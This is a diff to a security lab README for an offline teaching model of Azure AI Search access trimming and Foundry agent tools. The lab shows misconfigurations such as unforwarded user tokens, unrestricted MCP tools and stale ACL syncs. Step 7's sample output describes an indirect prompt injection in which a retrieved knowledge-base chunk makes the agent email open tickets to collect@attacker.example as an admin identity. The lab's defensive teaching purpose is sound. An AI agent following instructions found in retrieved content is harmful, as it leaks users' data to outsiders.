@@ -53,6 +53,7 @@ cd labs/az13
 | `attack.py` | 9 attacks (`A1`-`A9`) and 5 legitimate requests (`L1`-`L5`), three setups |
 | `twin.py` | A **teaching model** of Azure AI Search trimming, a knowledge base retrieve, and the agent runtime (see below) |
 | `stand_in_model.py` | The "model": plain Python, obeys any lab placeholder it reads (the worst case) |
+| `explore.py` | Step 1b: shows each piece on its own (`source`, `index`, `search`, `retrieve`, `access`, `agent`, `turn`, `identity`). Read-only: it reads the lab's files and asks `twin.py`; nothing is sent anywhere |
 | `hunt.py` | Three hunting rules over the audit log; `reconstruct()` is challenge 4 |
 | `sync_check.py`, `review_policy.py`, `safe_filter.py` | Challenges 1, 2 and 3 (stubs) |
 | `contoso/` | Version 1: `search.json` (service, index, knowledge base), `agent.json` (agent, connections, guardrail), `app.json` (helpdesk-web), `roles.json` |
@@ -78,7 +79,8 @@ cd labs/az13
   ("Without this projection, chunk-level references aren't filtered",
   [document-level access](https://learn.microsoft.com/en-us/azure/search/search-document-level-access-overview)).
 - **Permission sync**: the index holds the ACL as of the last sync; changes appear only after the next one.
-- **MCP tool**: `allowed_tools` omitted = "all of the tools in the MCP server"; `require_approval` values `always`,
+- **MCP tool**: `allowed_tools` omitted or `[]` = "the agent can access all tools exposed by the MCP server" ("An
+  empty list (`[]`) allows all tools exposed by the MCP server, not zero tools"); `require_approval` values `always`,
   `never`, `{"never": [...]}`, `{"always": [...]}`, default `always`; approval goes through an
   `mcp_approval_request` item ([MCP tool](https://learn.microsoft.com/en-us/azure/foundry/agents/how-to/tools/model-context-protocol)).
 - **Guardrails**: tool-response checks run only for tools with moderation support, and MCP isn't on Microsoft's list
@@ -95,6 +97,246 @@ in `contoso/` and `fixes/` uses Microsoft's property names where they exist (`pe
 **About the data and safety.** Object IDs are the example GUIDs Microsoft uses in its push-API page. Every injected
 line is a labelled `[LAB-PLACEHOLDER TOOL REQUEST ...]`, not a working payload; the stand-in model reacts to the marker.
 Outside addresses use the reserved `.example` domain. Nothing here contacts Azure. Test 18 checks all of that.
+
+## Step 1b · Before you review: look at each piece (about 10 minutes)
+
+New to Azure AI Search and Foundry agents? Do this before Step 1 (lesson 13.3 calls it "Before you start", and
+lesson 13.0 walks through the same twelve ideas). `explore.py` shows each piece one at a time. Real output below is
+from a fresh Ubuntu machine (recording run 41615029550).
+
+**What it really runs.** Nothing that changes anything: `explore.py` reads `data/`, `contoso/` and `fixes/` and asks
+`twin.py`, the lab's offline teaching model. No network, no Azure subscription.
+
+**0. Look before you run.** `make -n setup` prints what `make setup` would run, without running it:
+
+```bash
+make -n setup
+make setup
+```
+
+```text
+python3 ../../tools/check_python.py 3.11
+Nothing to install for this lab: Python 3.12 and its standard library are all it needs.
+```
+
+Other labs make a *virtual environment* here (a private folder for that lab's Python packages, so versions don't
+clash; it keeps versions apart, it isn't a security sandbox) and run `pip install`. This lab uses only Python's
+standard library, so `make setup` just checks your Python version.
+
+**1. The data source.** Seven documents, each with the ACL (who may read it) and Purview label its source gives it:
+
+```bash
+python3 explore.py source
+```
+
+```text
+The data source: 7 documents in Contoso's storage, each with the ACL the source system gives it.
+
+  id        label                who may read it (ACL)    title
+  KB-1001   General              all                      Reset your VPN password
+  KB-1001b  General              all                      VPN client certificate renewal (edited by a contractor ...
+            + one line is a labelled lab placeholder: an instruction hidden in a document
+  KB-1003   General              all                      Contractor offboarding checklist
+            + one line is a labelled lab placeholder: an instruction hidden in a document
+  KB-2040   Confidential         helpdesk-staff           Refund approvals for hardware
+  HR-7001   Highly Confidential  helpdesk-staff, hr       Pay bands 2027
+  HR-7002   Confidential         hr                       Service desk restructuring plan
+              ACL changed 2026-10-12T10:00:00Z: helpdesk-staff, hr (uploaded to the wrong folder: shared with all helpdesk staff)
+              ACL changed 2026-10-19T09:00:00Z: hr (fixed: HR only)
+  HR-7003   Highly Confidential  hr                       Disciplinary case notes, service desk
+
+"all" = everyone. Groups and people are Microsoft Entra object IDs; names are shown here.
+Labels are Microsoft Purview sensitivity labels: General < Confidential < Highly Confidential.
+```
+
+Two documents carry a hidden instruction. HR-7002 was shared with the wrong group for a week, then fixed at 09:00.
+
+**2. Indexing: one row per chunk.** Version 1 has only a plain `group_ids` string field, and labels on first chunks
+only:
+
+```bash
+python3 explore.py index contoso
+```
+
+```text
+Index helpdesk-kb (setup contoso)
+  permissionFilterOption  disabled  native trimming by the user's token off
+  permission fields       none
+  purviewEnabled          true      sensitivity labels checked at query time
+  last permission sync    2026-10-19T08:00:00Z (daily 08:00 UTC)
+
+Indexing splits each document into chunks; one chunk = one row. A field reaches a chunk row only if the
+index projection maps it there:
+
+  chunk       sensitivityLabel     group_ids
+  KB-1001#0   General              all
+  KB-1001b#0  General              all
+  KB-1001b#1  -                    all
+  KB-1003#0   General              all
+  KB-1003#1   -                    all
+  KB-2040#0   Confidential         helpdesk-staff
+  HR-7001#0   Highly Confidential  helpdesk-staff, hr
+  HR-7001#1   -                    helpdesk-staff, hr
+  HR-7002#0   Confidential         helpdesk-staff, hr
+  HR-7003#0   Highly Confidential  hr
+
+- = this chunk row doesn't have the field; (none) = nobody by this field.
+group_ids is a plain string field: only a $filter your app writes checks it. GroupIds and UserIds are
+permission fields: the engine checks them against the user's token.
+```
+
+The hardened build turns on native trimming and projects permission fields and labels to every chunk:
+
+```bash
+python3 explore.py index fixes
+```
+
+```text
+Index helpdesk-kb (setup fixes)
+  permissionFilterOption  enabled   native trimming by the user's token ON
+  permission fields       UserIds, GroupIds
+  purviewEnabled          true      sensitivity labels checked at query time
+  last permission sync    2026-10-19T08:00:00Z (daily 08:00 UTC)
+...
+  chunk       sensitivityLabel     group_ids              GroupIds               UserIds
+  HR-7001#0   Highly Confidential  helpdesk-staff, hr     helpdesk-staff, hr     (none)
+  HR-7001#1   Highly Confidential  helpdesk-staff, hr     helpdesk-staff, hr     (none)
+```
+
+**3. A direct query, with a filter your app writes.** helpdesk-web believes the groups the browser sends:
+
+```bash
+python3 explore.py search contoso "disciplinary case notes" --user bob --groups helpdesk-staff,hr
+```
+
+```text
+helpdesk-web, signed in as bob, queries the index directly (setup contoso):
+
+  POST /indexes/helpdesk-kb/docs/search
+  api-key: <query key> (a key carries no user)
+  x-ms-query-source-authorization:   not sent
+  search   "disciplinary case notes"
+  filter   group_ids/any(g: search.in(g, 'helpdesk-staff, hr'))
+
+  groups in the filter came from the REQUEST BODY (anyone can type them)
+
+The response: 1 result
+  HR-7003#0   Highly Confidential  "Case notes for an open disciplinary case on the service desk. ..."
+```
+
+**4. A knowledge base retrieve, with and without the user's token.** The agent's path, on the hardened build:
+
+```bash
+python3 explore.py retrieve fixes "disciplinary case notes" --user bob
+python3 explore.py retrieve fixes "disciplinary case notes" --user bob --no-token
+```
+
+```text
+The agent's knowledge base tool, for bob (setup fixes):
+
+  POST /knowledgebases/helpdesk-knowledge/retrieve   (over MCP: the tool knowledge_base_retrieve)
+  Authorization: Bearer <the project's managed identity>   (the app's right to query)
+  x-ms-query-source-authorization:   <bob's Entra token>  (whose documents)
+  knowledge sources  helpdesk-ks -> index helpdesk-kb
+  outputMode         extractiveData: return the chunks; answerSynthesis (preview) has a model write the answer
+
+The response: 0 results
+```
+
+With `--no-token` the header line reads `x-ms-query-source-authorization:   NOT SENT`, the twin quotes Microsoft
+("returns unfiltered results" if the user's identity is omitted), and Bob gets `HR-7003#0`. On a direct query the
+same mistake returns only documents open to everyone. Same index, two paths, two meanings of "no header".
+
+**5. One access decision.** HR locked HR-7002 at 09:00; the index synced at 08:00:
+
+```bash
+python3 explore.py access dana HR-7002 --setup fixes
+```
+
+```text
+Would dana get HR-7002 "Service desk restructuring plan"? (setup fixes, now 2026-10-19T10:00:00Z)
+
+  1. ACL in the source now       hr
+  2. ACL the index holds         helpdesk-staff, hr   (as of the last sync, 2026-10-19T08:00:00Z)
+     changed after that sync     2026-10-19T09:00:00Z: fixed: HR only   -> the index is out of date
+  3. dana's token                groups helpdesk-staff; may open labels General, Confidential
+  4. chunk HR-7002#0             a permission field matches? yes (helpdesk-staff)
+                                 label dana may open? Confidential, yes   -> RETURNED
+
+  Microsoft: "a document is considered authorized if any filter succeeds"; "all" opens it to everyone.
+```
+
+**6. The prompt agent.** Model, tools, approval and the credential behind each connection:
+
+```bash
+python3 explore.py agent contoso
+```
+
+```text
+The prompt agent helpdesk-agent (setup contoso): kind prompt, model deployment helpdesk-chat
+  instructions  "You are TSG Helpdesk. Answer from the knowledge base. Only HR staff may see HR documents."
+
+  Tools:
+    azure_ai_search   index helpdesk-kb through conn-search-key (ApiKey: one key for every user)
+    mcp knowledge-base connection conn-kb-mi (ProjectManagedIdentity: the project's identity, shared)
+      allowed_tools    knowledge_base_retrieve
+      require_approval never
+      user token       not forwarded
+    mcp helpdesk-actions connection conn-actions-pat (CustomKeys: svc-helpdesk-admin's credential for every user)
+      allowed_tools    not set: every tool on the server (search_tickets, create_ticket, send_email, close_ticket, delete_ticket)
+      require_approval never
+
+  Guardrail contoso-agent-v1:
+    Jailbreak                        at user_input
+    Hate,Sexual,Violence,SelfHarm    at user_input
+    Hate,Sexual,Violence,SelfHarm    at output
+
+  Approvals answered by: nobody (no tool asks)
+  Audit log of tool calls: off
+```
+
+`python3 explore.py agent fixes` shows the hardened version: the token forwarded, `allowed_tools` set,
+`require_approval {"never": ["search_tickets"]}`, OAuth identity passthrough, and the guardrail note `tool_response
+checks run only for tool types with moderation support: here none (MCP is not on the list)`.
+
+**7. One turn, step by step.** Read it from the top: who, retrieve, guardrail, the write, the answer.
+
+```bash
+python3 explore.py turn contoso bob "VPN client certificate renewal"
+```
+
+```text
+One turn on Foundry Agent Service (setup contoso). Shapes follow Microsoft's docs; nothing is sent.
+
+  1. who        bob@contoso.com, from the Entra sign-in
+  2. ask        the app calls the agent with the question "VPN client certificate renewal"
+  3. retrieve   knowledge_base_retrieve (Foundry IQ, over MCP)
+                x-ms-query-source-authorization: NOT SENT
+                found: KB-1001b#0, KB-1001b#1
+  4. guardrail  guardrail did not scan the retrieved content (no tool-response control)
+  5. act        send_email(to=collect@attacker.example, subject=kb, body=open-tickets)
+                asked for by a retrieved chunk; no approval asked (require_approval never)
+                actions server: done as svc-helpdesk-admin
+  6. answer     "Renew the VPN client certificate from the Company Portal app when it warns you. [KB-1001b] ..."
+```
+
+On `fixes` the same turn sends Bob's token, then stops at `approval` with an `mcp_approval_request`, and the
+stand-in reviewer approves (`done as bob`): that is challenge 2.
+
+**8. Whose identity reaches the tool server.**
+
+```bash
+python3 explore.py identity contoso
+```
+
+```text
+What the actions server sees when bob asks to close tickets (connection conn-actions-pat):
+  ticket 4471, owner bob@contoso.com     YES  close_ticket 4471 done as svc-helpdesk-admin
+  ticket 4480, owner priya@contoso.com   YES  close_ticket 4480 done as svc-helpdesk-admin
+```
+
+With `identity fixes` (OAuth identity passthrough) the same request for Priya's ticket gets
+`403: bob may not close_ticket ticket 4480 (owner priya@contoso.com)`.
 
 ## Step 1 · Review before anyone attacks (`make check`)
 
